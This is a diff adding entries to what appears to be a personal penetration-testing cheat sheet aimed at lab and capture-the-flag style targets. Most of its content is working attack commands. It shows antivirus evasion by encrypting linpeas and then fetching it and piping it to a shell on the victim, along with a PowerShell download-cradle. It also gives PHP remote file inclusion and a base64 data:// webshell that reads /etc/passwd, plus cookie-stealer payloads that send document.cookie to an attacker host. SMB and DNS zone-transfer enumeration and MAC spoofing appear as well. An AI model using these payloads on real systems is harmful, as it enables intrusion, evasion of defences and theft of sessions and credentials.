@@ -15,6 +15,14 @@ Type `/nc` to search.
  🔥 HOT HOT HOT
 In this file: log4shell (java), printnightmare (windows), pwnkit (linux).
 
+# IP setup
+host=127.0.0.1
+ping $host
+
+# change MAC address (mac change)
+openssl rand -hex 6 | sed 's/\(..\)/\1:/g; s/.$//'
+sudo ifconfig en0 ether  <MAC address>
+
 # ENCODING (encoding, enc)
 string to base64
 echo -n "string" | base64
@@ -70,6 +78,17 @@ https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASbat
 # LinPeas (linpeas, linux, priv)
 Download:
 wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+
+# HIDE FORM AV (anti virus, av, hide):
+## open-ssl encryption
+openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:AVBypassWithAES -in linpeas.sh -out lp.enc
+sudo python -m SimpleHTTPServer 80 #Start HTTP server
+curl 10.10.10.10/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:AVBypassWithAES | sh #Download from the victim
+
+## base64 encoded
+base64 -w0 linpeas.sh > lp.enc
+sudo python -m SimpleHTTPServer 80 #Start HTTP server
+curl 10.10.10.10/lp.enc | base64 -d | sh #Download from the victim
 
 In Powershell:
 IEX(New-Object Net.WebClient).DownloadString('http://...')
@@ -157,7 +176,17 @@ Proc:
 # SAMBA (samba)
 enum4linux host
 searchsploit samba
+
+# SMB
 smbmap -H 10.10.10.3
+
+# SMBCLIENT
+smbclient -N -L \\\\ip
+smbclient \\\\ip\\sharename
+
+# PHP rfi (rfi, smb, shell, webshell, php)
+impacket-smbserver -smb2support share $(pwd)
+/index.php?language=\\<OUR_IP>\shell.php&cmd=whoami
 
 # MINIMODEM
 Ascii to WAV:
@@ -356,8 +385,7 @@ ${jndi:${lower:l}${lower:d}a${lower:p}://${hostName}.${sys:java.version}.xx.inte
 # ENUM4LINUX
 enum4linux 10.10.82.233
 
-# SMBCLIENT
-smbclient \\\\ip\\sharename
+
 
 # NFS (nfs, network share, linux)
 showmount -e 10.129.57.246
@@ -365,10 +393,18 @@ mkdir nfsmount
 mount -t nfs 10.129.57.246:/ ./nfsmount/ -o nolock
 
 # dig (enum, dns, ns, nameserver, zone transfer)
+dig any @$host support.htb
 dig axfr internal.inlanefreight.htb @10.129.216.3
+dig axfr @10.10.11.174
+dig axfr @10.10.11.174 domain
 
 # DNS RECON (enum, recon, brute force, dns)
 dnsrecon -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -d domain.htb -t brt
+msfconsole:
+search enum_dns
+set DOMAIN support.htb
+set NS DNS_IP
+run
 
 # METASPLOIT (metasploit, msfconsole)
 Basic msfconsole:
@@ -538,12 +574,16 @@ html
 &#34&#39&#62&#60&#104&#49&#62&#120&#115&#115&#60&#47&#104&#49&#62
 
 # COOKIE STEALER
-
+new Image().src='http://OUR_IP/index.php?c='+document.cookie
 "'><img src=1337xx onerror=this.src='http://10.8.10.59:8080/?'+document.cookie;>
 
 # PHP Local File Inclusion (php, lfi)
 index.php?param=php://filter/convert.base64-encode/resource=index
 url http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=index.php | base64 -d
+
+# PHP RCE (php, rce, base64)
+http://68.183.35.90:30015/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat%20/etc/passwd
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat /37809e2f8952f06139011994726d9ef1.txt
 
 # XXE (XML external entities):
 In XML:
